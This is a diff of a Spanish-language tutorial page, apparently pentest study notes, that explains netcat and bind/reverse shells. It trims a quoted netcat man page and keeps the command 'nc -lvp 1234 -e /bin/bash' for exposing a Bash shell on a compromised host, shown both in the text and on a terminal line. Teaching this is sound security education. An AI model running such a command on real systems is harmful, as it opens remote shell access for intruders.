@@ -28,9 +28,7 @@ Un shell inverso es una vulnerabilidad en la que un sistema atacante tiene un oy
 
 <img src="../../../.gitbook/assets/file.excalidraw (3).svg" alt="" class="gitbook-drawing">
 
-Netcat es una de las mejores y más versátiles herramientas para probadores de lápiz porque es liviana y muy portátil. Incluso puede ver esto explicado en los primeros párrafos de la página de manual **de netcat** , como se muestra en el Ejemplo 8-1.
-
-_La herramienta Netcat._
+### Netcat
 
 ```
 NAME
@@ -44,54 +42,13 @@ DESCRIPTION
              netcat is a simple unix utility which reads and writes
 data across network connections, using TCP or UDP protocol. It is
 designed to be a reliable "back-end" tool that can be used directly
-or easily driven by other programs and scripts. At the same time, it
-is a feature-rich network debugging and exploration tool, since it can
-create almost any kind of connection you would need and has several
-interesting built-in capabilities. Netcat, or "nc" as the actual
-program is named, should have been supplied long ago as another one
-of those cryptic but standard Unix tools.
-
-In the simplest usage, "nc host port" creates a TCP connection to the
-given port on the given target host. Your standard input is then sent
-to the host, and anything that comes back across the connection is
-sent to your standard output. This continues indefinitely, until the
-network side of the connection shuts down. Note that this behavior is
-different from most other applications which shut everything down and
-exit after an end-of-file on the standard input.
-
-Netcat can also function as a server, by listening for inbound
-connections on arbitrary ports and then doing the same reading and
-writing. With minor limitations, netcat doesn't really care if it
-runs in "client" or "server" mode -- it still shovels data back and
-forth until there isn't anymore left. In either mode, shutdown can be
-forced after a configurable time of inactivity on the network side.
-
-And it can do this via UDP too, so netcat is possibly the "udp
-telnet-like" application you always wanted for testing your UDP-mode
-servers. UDP, asthe "U" implies, gives less reliable data transmission
-than TCP connections and some systems may have trouble sending large
-amounts of data that way, but it's still a useful capability to have.
-
-You may be asking "why not just use telnet to connect to arbitrary
-ports?" Valid question, and here are some reasons. Telnet has the
-"standard input EOF" problem, so one must introduce calculated delays
-in driving scripts to allow network output to finish. This is the
-main reason netcat stays running until the network side closes.
-Telnet also will not transfer arbitrary binary data, because certain
-characters are interpreted as telnet options and are thus removed from
-the data stream. Telnet also emits some of its diagnostic messages to
-standard output, where netcat keeps such things religiously separated
-from its output and will never modify any of the real data in
-transit unless you really want it to. And of course, telnet is
-incapable of listening for inbound connections, or using UDP instead.
-Netcat doesn't have any of these limitations, is much smaller and
-faster than telnet, and has many other advantages.
+or easily driven..........>
 
 ```
 
-Veamos Netcat en acción. Un atacante podría usar el comando **nc -lvp 1234 -e /bin/bash** en el sistema comprometido (192.168.78.6) para crear un escucha en el puerto **1234** y ejecutar ( **-e** ) el shell Bash ( **/bin/bash** ). Esto se demuestra en el ejemplo 8-2. Netcat utiliza entrada estándar (stdin), salida estándar (stdout) y error estándar (stderr) para el socket IP.
+Un atacante podría usar el comando **`nc -lvp 1234 -e /bin/bash`** en el sistema comprometido (192.168.78.6) para crear un escucha en el puerto **`1234`** y ejecutar ( **-e** ) el shell Bash ( **/bin/bash** ).
 
-C_reación de un shell de enlace utilizando Netcat._
+#### C_reación de un shell de enlace utilizando Netcat._
 
 ```
 omar@jorel:~$ nc -lvp 1234 -e /bin/bash
